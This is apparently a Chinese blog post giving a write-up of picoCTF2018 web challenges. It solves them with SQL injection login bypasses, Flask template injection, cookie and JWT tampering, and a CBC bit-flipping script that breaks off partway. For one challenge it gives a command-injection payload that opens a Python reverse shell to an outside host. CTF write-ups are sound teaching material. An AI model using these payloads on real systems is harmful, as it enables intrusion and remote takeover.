@@ -1,0 +1,768 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="ctf,web,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="空了好几个月终于有时间刷题了，这里先拿picoCTF来暖下手（虽然说是给高中生的，不过还是学了一波SSTI） P.S. 那几道SSTI的题不知道的payload为什么更新时会报错就加了空格，怕是hexo自己调用了orz。反正有空格删掉就好">
+<meta name="keywords" content="ctf,web">
+<meta property="og:type" content="article">
+<meta property="og:title" content="picoCTF2018 web wp">
+<meta property="og:url" content="http://yoursite.com/2019/02/11/picoCTF2018-web-wp/index.html">
+<meta property="og:site_name" content="shifeng_kazeの家">
+<meta property="og:description" content="空了好几个月终于有时间刷题了，这里先拿picoCTF来暖下手（虽然说是给高中生的，不过还是学了一波SSTI） P.S. 那几道SSTI的题不知道的payload为什么更新时会报错就加了空格，怕是hexo自己调用了orz。反正有空格删掉就好">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/picoCTF2018_web_wp/8cd4b73a93e44618034ed791d0d2135f.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/picoCTF2018_web_wp/277f81030f32ab7a237eac80f59b5c04.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/picoCTF2018_web_wp/0018814a478ca2fedb00fe938fcdd4a3.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/picoCTF2018_web_wp/5796b44d5e272d0f2be91c6f89922b9b.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/picoCTF2018_web_wp/6cb1b33abe39995a3cecfaaef3d7fc14.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/picoCTF2018_web_wp/9997eb5d763a6c241410725848f930ee.png">
+<meta property="og:updated_time" content="2019-02-11T14:04:35.911Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="picoCTF2018 web wp">
+<meta name="twitter:description" content="空了好几个月终于有时间刷题了，这里先拿picoCTF来暖下手（虽然说是给高中生的，不过还是学了一波SSTI） P.S. 那几道SSTI的题不知道的payload为什么更新时会报错就加了空格，怕是hexo自己调用了orz。反正有空格删掉就好">
+<meta name="twitter:image" content="http://shifeng-kaze.cn/blog/picoCTF2018_web_wp/8cd4b73a93e44618034ed791d0d2135f.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/02/11/picoCTF2018-web-wp/">
+
+
+
+
+
+  <title>picoCTF2018 web wp | shifeng_kazeの家</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">shifeng_kazeの家</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/02/11/picoCTF2018-web-wp/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="shifeng_kaze">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="http://shifeng-kaze.cn/blog/head/kotori.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="shifeng_kazeの家">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">picoCTF2018 web wp</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-02-11T21:09:37+08:00">
+                2019-02-11
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>空了好几个月终于有时间刷题了，这里先拿picoCTF来暖下手（虽然说是给高中生的，不过还是学了一波SSTI）</p>
+<p>P.S. 那几道SSTI的题不知道的payload为什么更新时会报错就加了空格，怕是hexo自己调用了orz。反正有空格删掉就好</p>
+<a id="more"></a>
+<h2 id="Inspect-Me"><a href="#Inspect-Me" class="headerlink" title="Inspect Me"></a>Inspect Me</h2><p>F12看到注释里提示了学了html和css、js，那就去这些文件里找flag</p>
+<h2 id="Logon"><a href="#Logon" class="headerlink" title="Logon"></a>Logon</h2><p>先随便尝试个用户名和密码输入，发现登陆成功但没有权限</p>
+<p>于是用抓包登录，发现重定向到flag页面，同时设置了个admin变量在cookie</p>
+<p><img src="http://shifeng-kaze.cn/blog/picoCTF2018_web_wp/8cd4b73a93e44618034ed791d0d2135f.png" alt=""></p>
+<p>于是修改为true发送到flag页面得flag</p>
+<h2 id="Irish-Name-Repo"><a href="#Irish-Name-Repo" class="headerlink" title="Irish Name Repo"></a>Irish Name Repo</h2><p>打开找到admin登录界面</p>
+<p>尝试万能密码登录成功</p>
+<p>payload: <code>username=admin&amp;password=1&#39;or &#39;1&#39;=&#39;1</code></p>
+<h2 id="Mr-Robots"><a href="#Mr-Robots" class="headerlink" title="Mr. Robots"></a>Mr. Robots</h2><p>打开robots.txt即可</p>
+<h2 id="Client-Side-is-Still-Bad"><a href="#Client-Side-is-Still-Bad" class="headerlink" title="Client Side is Still Bad"></a>Client Side is Still Bad</h2><p>F12找到一串js里组合就有flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">function verify() &#123;</span><br><span class="line">	checkpass = document.getElementById(&quot;pass&quot;).value;</span><br><span class="line">	split = 4;</span><br><span class="line">	if (checkpass.substring(split*7, split*8) == &apos;&#125;&apos;) &#123;</span><br><span class="line">		if (checkpass.substring(split*6, split*7) == &apos;17e9&apos;) &#123;</span><br><span class="line">			if (checkpass.substring(split*5, split*6) == &apos;d_91&apos;) &#123;</span><br><span class="line">				if (checkpass.substring(split*4, split*5) == &apos;s_ba&apos;) &#123;</span><br><span class="line">					if (checkpass.substring(split*3, split*4) == &apos;nt_i&apos;) &#123;</span><br><span class="line">						if (checkpass.substring(split*2, split*3) == &apos;clie&apos;) &#123;</span><br><span class="line">							if (checkpass.substring(split, split*2) == &apos;CTF&#123;&apos;) &#123;</span><br><span class="line">								if (checkpass.substring(0,split) == &apos;pico&apos;) &#123;</span><br><span class="line">									alert(&quot;You got the flag!&quot;)</span><br><span class="line">								&#125;</span><br><span class="line">							&#125;</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;else &#123;</span><br><span class="line">		alert(&quot;Incorrect password&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="No-Login"><a href="#No-Login" class="headerlink" title="No Login"></a>No Login</h2><p>进去点flag就有了？？？ 然后弄了一下又没了？？？<br>大概这才是常规吧，登陆和登出页面都用不了，就抓包看看。<br>发现有个session变量，试着base64解密发现不行</p>
+<p><img src="http://shifeng-kaze.cn/blog/picoCTF2018_web_wp/277f81030f32ab7a237eac80f59b5c04.png" alt=""></p>
+<p>搞了好久才知道是jwt加密，用于json安全的加密，去官网能直接解密【那还有啥用？？？</p>
+<p><img src="http://shifeng-kaze.cn/blog/picoCTF2018_web_wp/0018814a478ca2fedb00fe938fcdd4a3.png" alt=""></p>
+<p>和之前题一样，在cookie加个admin=1就行</p>
+<h2 id="Secret-Agent"><a href="#Secret-Agent" class="headerlink" title="Secret Agent"></a>Secret Agent</h2><p>点flag说我不是google，然后给出来我的user-agent。于是就试chrome发现不行，referer修改也不行。最后用谷歌爬虫 <code>googlebot</code> 作为user-agent才ok</p>
+<h2 id="Buttons"><a href="#Buttons" class="headerlink" title="Buttons"></a>Buttons</h2><p>两个按钮，一个是表单一个是链接，把链接修改成表单就好</p>
+<h2 id="The-Vault"><a href="#The-Vault" class="headerlink" title="The Vault"></a>The Vault</h2><p>给了源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  ini_set(&apos;error_reporting&apos;, E_ALL);</span><br><span class="line">  ini_set(&apos;display_errors&apos;, &apos;On&apos;);</span><br><span class="line"></span><br><span class="line">  include &quot;config.php&quot;;</span><br><span class="line">  $con = new SQLite3($database_file);</span><br><span class="line"></span><br><span class="line">  $username = $_POST[&quot;username&quot;];</span><br><span class="line">  $password = $_POST[&quot;password&quot;];</span><br><span class="line">  $debug = $_POST[&quot;debug&quot;];</span><br><span class="line">  $query = &quot;SELECT 1 FROM users WHERE name=&apos;$username&apos; AND password=&apos;$password&apos;&quot;;</span><br><span class="line"></span><br><span class="line">  if (intval($debug)) &#123;</span><br><span class="line">    echo &quot;&lt;pre&gt;&quot;;</span><br><span class="line">    echo &quot;username: &quot;, htmlspecialchars($username), &quot;\n&quot;;</span><br><span class="line">    echo &quot;password: &quot;, htmlspecialchars($password), &quot;\n&quot;;</span><br><span class="line">    echo &quot;SQL query: &quot;, htmlspecialchars($query), &quot;\n&quot;;</span><br><span class="line">    echo &quot;&lt;/pre&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  //validation check</span><br><span class="line">  $pattern =&quot;/.*[&apos;\&quot;].*OR.*/i&quot;;</span><br><span class="line">  $user_match = preg_match($pattern, $username);</span><br><span class="line">  $password_match = preg_match($pattern, $username);</span><br><span class="line">  if($user_match + $password_match &gt; 0)  &#123;</span><br><span class="line">    echo &quot;&lt;h1&gt;SQLi detected.&lt;/h1&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  else &#123;</span><br><span class="line">    $result = $con-&gt;query($query);</span><br><span class="line">    $row = $result-&gt;fetchArray();</span><br><span class="line">    </span><br><span class="line">    if ($row) &#123;</span><br><span class="line">      echo &quot;&lt;h1&gt;Logged in!&lt;/h1&gt;&quot;;</span><br><span class="line">      echo &quot;&lt;p&gt;Your flag is: $FLAG&lt;/p&gt;&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      echo &quot;&lt;h1&gt;Login failed.&lt;/h1&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>读一下过滤了xxx’xxxorxxx 这种字符串，就不允许万能密码。<br>不过这题解法挺多的，提供一种<br>payload:<br>    <code>username=a&#39; /*&amp;password=*/or 1=1 limit 1 or &#39;</code></p>
+<h2 id="Artisinal-Handcrafted-HTTP-3"><a href="#Artisinal-Handcrafted-HTTP-3" class="headerlink" title="Artisinal Handcrafted HTTP 3"></a>Artisinal Handcrafted HTTP 3</h2><p>好像服务器炸了</p>
+<h2 id="Flaskcards"><a href="#Flaskcards" class="headerlink" title="Flaskcards"></a>Flaskcards</h2><p>不知道有flask这个框架让我搞了好久，flask是个python的框架，于是找找SSTI漏洞</p>
+<p>尝试在url上添加 <code>2</code> 并未报错<br>注册 <code>2</code> 账号并登录后也没变<br>最后在create card处将question和answer设为 <code>2</code><br>查看list card时发现都成了2，说明可以注入。</p>
+<p>于是尝试 <code>{ { config.item() } }</code> ，成功在secretkey找到flag</p>
+<h2 id="fancy-alive-monitoring"><a href="#fancy-alive-monitoring" class="headerlink" title="fancy-alive-monitoring"></a>fancy-alive-monitoring</h2><p>进去后可以看到有源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;title&gt;Monitoring Tool&lt;/title&gt;</span><br><span class="line">	&lt;script&gt;</span><br><span class="line">	function check()&#123;</span><br><span class="line">		ip = document.getElementById(&quot;ip&quot;).value;</span><br><span class="line">		chk = ip.match(/^\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;$/);</span><br><span class="line">		if (!chk) &#123;</span><br><span class="line">			alert(&quot;Wrong IP format.&quot;);</span><br><span class="line">			return false;</span><br><span class="line">		&#125; else &#123;</span><br><span class="line">			document.getElementById(&quot;monitor&quot;).submit();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;h1&gt;Monitoring Tool ver 0.1&lt;/h1&gt;</span><br><span class="line">	&lt;form id=&quot;monitor&quot; action=&quot;index.php&quot; method=&quot;post&quot; onsubmit=&quot;return false;&quot;&gt;</span><br><span class="line">	&lt;p&gt; Input IP address of the target host</span><br><span class="line">	&lt;input id=&quot;ip&quot; name=&quot;ip&quot; type=&quot;text&quot;&gt;</span><br><span class="line">	&lt;/p&gt;</span><br><span class="line">	&lt;input type=&quot;button&quot; value=&quot;Go!&quot; onclick=&quot;check()&quot;&gt;</span><br><span class="line">	&lt;/form&gt;</span><br><span class="line">	&lt;hr&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$ip = $_POST[&quot;ip&quot;];</span><br><span class="line">if ($ip) &#123;</span><br><span class="line">	// super fancy regex check!</span><br><span class="line">	if (preg_match(&apos;/^(([1-9]?[0-9]|1[0-9]&#123;2&#125;|2[0-4][0-9]|25[0-5]).)&#123;3&#125;([1-9]?[0-9]|1[0-9]&#123;2&#125;|2[0-4][0-9]|25[0-5])/&apos;,$ip)) &#123;</span><br><span class="line">		exec(&apos;ping -c 1 &apos;.$ip, $cmd_result);</span><br><span class="line">		foreach($cmd_result as $str)&#123;</span><br><span class="line">			if (strpos($str, &apos;100% packet loss&apos;) !== false)&#123;</span><br><span class="line">				printf(&quot;&lt;h3&gt;Target is NOT alive.&lt;/h3&gt;&quot;);</span><br><span class="line">				break;</span><br><span class="line">			&#125; else if (strpos($str, &apos;, 0% packet loss&apos;) !== false)&#123;</span><br><span class="line">				printf(&quot;&lt;h3&gt;Target is alive.&lt;/h3&gt;&quot;);</span><br><span class="line">				break;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		echo &quot;Wrong IP Format.&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">&lt;a href=&quot;index.txt&quot;&gt;index.php source code&lt;/a&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>js部分的过滤直接无视，然后读php部分的<br>就要求前面的是一个ip，不过没有$结尾于是可以往后面继续加命令</p>
+<p>payload:<br><code>ip=0.0.0.0;python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;your_vps_ip&quot;,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</code></p>
+<p>反弹shell后</p>
+<p><img src="http://shifeng-kaze.cn/blog/picoCTF2018_web_wp/5796b44d5e272d0f2be91c6f89922b9b.png" alt=""></p>
+<p>读取找到flag</p>
+<h2 id="Secure-Logon"><a href="#Secure-Logon" class="headerlink" title="Secure Logon"></a>Secure Logon</h2><p>先登进去看看，提示了cookie</p>
+<p><img src="http://shifeng-kaze.cn/blog/picoCTF2018_web_wp/6cb1b33abe39995a3cecfaaef3d7fc14.png" alt=""></p>
+<p>应该是要把admin的只弄为1就行</p>
+<p>然后读一下源码，是CBC加密，应该又是一道CBC翻转的题</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask, render_template, request, url_for, redirect, make_response, flash</span><br><span class="line">import json</span><br><span class="line">from hashlib import md5</span><br><span class="line">from base64 import b64decode</span><br><span class="line">from base64 import b64encode</span><br><span class="line">from Crypto import Random</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = &apos;seed removed&apos;</span><br><span class="line">flag_value = &apos;flag removed&apos;</span><br><span class="line"></span><br><span class="line">BLOCK_SIZE = 16  # Bytes</span><br><span class="line">pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * \</span><br><span class="line">                chr(BLOCK_SIZE - len(s) % BLOCK_SIZE)</span><br><span class="line">unpad = lambda s: s[:-ord(s[len(s) - 1:])]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&quot;/&quot;)</span><br><span class="line">def main():</span><br><span class="line">    return render_template(&apos;index.html&apos;)</span><br><span class="line"></span><br><span class="line">@app.route(&apos;/login&apos;, methods=[&apos;GET&apos;, &apos;POST&apos;])</span><br><span class="line">def login():</span><br><span class="line">    if request.form[&apos;user&apos;] == &apos;admin&apos;:</span><br><span class="line">        message = &quot;I&apos;m sorry the admin password is super secure. You&apos;re not getting in that way.&quot;</span><br><span class="line">        category = &apos;danger&apos;</span><br><span class="line">        flash(message, category)</span><br><span class="line">        return render_template(&apos;index.html&apos;)</span><br><span class="line">    resp = make_response(redirect(&quot;/flag&quot;))</span><br><span class="line"></span><br><span class="line">    cookie = &#123;&#125;</span><br><span class="line">    cookie[&apos;password&apos;] = request.form[&apos;password&apos;]</span><br><span class="line">    cookie[&apos;username&apos;] = request.form[&apos;user&apos;]</span><br><span class="line">    cookie[&apos;admin&apos;] = 0</span><br><span class="line">    print(cookie)</span><br><span class="line">    cookie_data = json.dumps(cookie, sort_keys=True)</span><br><span class="line">    encrypted = AESCipher(app.secret_key).encrypt(cookie_data)</span><br><span class="line">    print(encrypted)</span><br><span class="line">    resp.set_cookie(&apos;cookie&apos;, encrypted)</span><br><span class="line">    return resp</span><br><span class="line"></span><br><span class="line">@app.route(&apos;/logout&apos;)</span><br><span class="line">def logout():</span><br><span class="line">    resp = make_response(redirect(&quot;/&quot;))</span><br><span class="line">    resp.set_cookie(&apos;cookie&apos;, &apos;&apos;, expires=0)</span><br><span class="line">    return resp</span><br><span class="line"></span><br><span class="line">@app.route(&apos;/flag&apos;, methods=[&apos;GET&apos;])</span><br><span class="line">def flag():</span><br><span class="line">  try:</span><br><span class="line">      encrypted = request.cookies[&apos;cookie&apos;]</span><br><span class="line">  except KeyError:</span><br><span class="line">      flash(&quot;Error: Please log-in again.&quot;)</span><br><span class="line">      return redirect(url_for(&apos;main&apos;))</span><br><span class="line">  data = AESCipher(app.secret_key).decrypt(encrypted)</span><br><span class="line">  data = json.loads(data)</span><br><span class="line"></span><br><span class="line">  try:</span><br><span class="line">     check = data[&apos;admin&apos;]</span><br><span class="line">  except KeyError:</span><br><span class="line">     check = 0</span><br><span class="line">  if check == 1:</span><br><span class="line">      return render_template(&apos;flag.html&apos;, value=flag_value)</span><br><span class="line">  flash(&quot;Success: You logged in! Not sure you&apos;ll be able to see the flag though.&quot;, &quot;success&quot;)</span><br><span class="line">  return render_template(&apos;not-flag.html&apos;, cookie=data)</span><br><span class="line"></span><br><span class="line">class AESCipher:</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Usage:</span><br><span class="line">        c = AESCipher(&apos;password&apos;).encrypt(&apos;message&apos;)</span><br><span class="line">        m = AESCipher(&apos;password&apos;).decrypt(c)</span><br><span class="line">    Tested under Python 3 and PyCrypto 2.6.1.</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    def __init__(self, key):</span><br><span class="line">        self.key = md5(key.encode(&apos;utf8&apos;)).hexdigest()</span><br><span class="line"></span><br><span class="line">    def encrypt(self, raw):</span><br><span class="line">        raw = pad(raw)</span><br><span class="line">        iv = Random.new().read(AES.block_size)</span><br><span class="line">        cipher = AES.new(self.key, AES.MODE_CBC, iv)</span><br><span class="line">        return b64encode(iv + cipher.encrypt(raw))</span><br><span class="line"></span><br><span class="line">    def decrypt(self, enc):</span><br><span class="line">        enc = b64decode(enc)</span><br><span class="line">        iv = enc[:16]</span><br><span class="line">        cipher = AES.new(self.key, AES.MODE_CBC, iv)</span><br><span class="line">        return unpad(cipher.decrypt(enc[16:])).decode(&apos;utf8&apos;)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>
+<p>抓包拿cookie，然后写脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf8 -*-  </span><br><span class="line">import time</span><br><span class="line">import base64</span><br><span class="line">from hashlib import md5</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">cookie = &quot;ljuA5nPE+JMCA38qG+4L4eJXBzTKNeUFEnDCczMdmk/1E30y7aHzVco36XWTwgA01dZOW+emMzr1Rtgzd3uGtqXNE+Zuh/WmBqkn1BZ6lnI=&quot;</span><br><span class="line">v = base64.b64decode(cookie)</span><br><span class="line">raw = v[0:16]</span><br><span class="line">url = r&apos;http://2018shell.picoctf.com:13747/flag&apos;</span><br><span class="line">for i in range(len(raw)):</span><br><span class="line">    print i</span><br><span 